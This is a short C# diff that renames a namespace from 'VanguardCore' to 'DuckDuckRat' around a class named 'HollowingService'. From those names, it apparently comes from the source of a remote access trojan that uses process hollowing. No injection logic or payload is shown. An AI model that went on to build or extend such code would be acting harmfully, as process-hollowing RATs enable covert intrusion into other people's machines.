@@ -6,7 +6,7 @@ using System.Collections.Generic;
 using System.Security.Principal;
 using System.Text;
 
-namespace VanguardCore
+namespace DuckDuckRat
 {
     public static unsafe class HollowingService
     {
@@ -295,3 +295,5 @@ namespace VanguardCore
             IntPtr FileHandle);
     }
 }
+
+
